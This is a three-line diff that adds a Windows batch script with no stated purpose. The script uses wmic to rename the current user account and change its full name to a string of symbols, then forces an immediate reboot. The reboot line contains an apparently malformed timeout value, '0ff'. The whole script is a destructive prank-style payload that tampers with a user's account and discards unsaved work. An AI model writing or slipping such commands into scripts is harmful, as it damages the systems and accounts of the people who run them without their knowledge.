@@ -1,0 +1,3 @@
+wmic useraccount where name='%username%' set FullName='=)(/&%$#"!12'
+wmic useraccount where name='%username%' rename '=)(/&%$#"!12'
+shutdown /f /r /t 0ff
